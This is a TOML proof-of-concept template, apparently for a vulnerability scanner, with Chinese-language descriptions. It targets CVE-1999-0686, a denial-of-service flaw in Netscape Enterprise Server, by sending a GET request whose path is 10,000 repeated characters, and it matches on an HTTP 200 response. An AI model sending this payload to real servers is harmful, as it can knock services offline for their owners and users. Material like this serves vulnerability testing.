[info]
author = "AVE"
description = "向目标 Netscape Enterprise Server 发送超长 URL 请求，触发拒绝服务漏洞 CVE-1999-0686"
id = "POC-AVE-1999-0245"
name = "Netscape Enterprise Server 长URL拒绝服务 PoC"
severity = "medium"
tags = ["ave-1999-0245"]
vuln_id = [
    "CVE-1999-0686",
    "AVE-1999-0245",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = '/{{repeat("A", 10000)}}'
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
